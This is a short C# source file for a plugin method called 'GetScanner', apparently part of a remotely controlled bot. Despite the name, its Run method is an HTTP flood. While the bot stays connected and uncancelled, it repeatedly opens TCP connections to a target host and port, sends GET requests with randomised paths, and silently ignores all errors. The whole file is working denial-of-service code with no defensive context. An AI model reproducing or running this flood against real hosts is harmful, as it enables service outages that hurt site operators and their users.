using System.Net.Sockets;
using System.Text;
using Plugin.Helper;

namespace Plugin.Methods;

internal class GetScanner : Method
{
	public string Name { get; } = "GetScanner";


	public void Run(string host, int port)
	{
		while (Client.itsConnect && !Common.CancellationTokenSource.IsCancellationRequested)
		{
			try
			{
				string text = "";
				if (Randomizer.random.Next(3) == 0)
				{
					for (int i = 0; i < Randomizer.random.Next(5); i++)
					{
						text = text + "/" + Common.subhtml[Randomizer.random.Next(Common.subhtml.Length)];
					}
					if (Randomizer.random.Next(2) == 0)
					{
						text += Common.subexiteons[Randomizer.random.Next(Common.subexiteons.Length)];
					}
				}
				Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket.Connect(host, port);
				byte[] bytes = Encoding.ASCII.GetBytes("GET " + text + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: Close\r\n\r\n");
				socket.Send(bytes);
				socket.Dispose();
			}
			catch
			{
			}
		}
	}
}
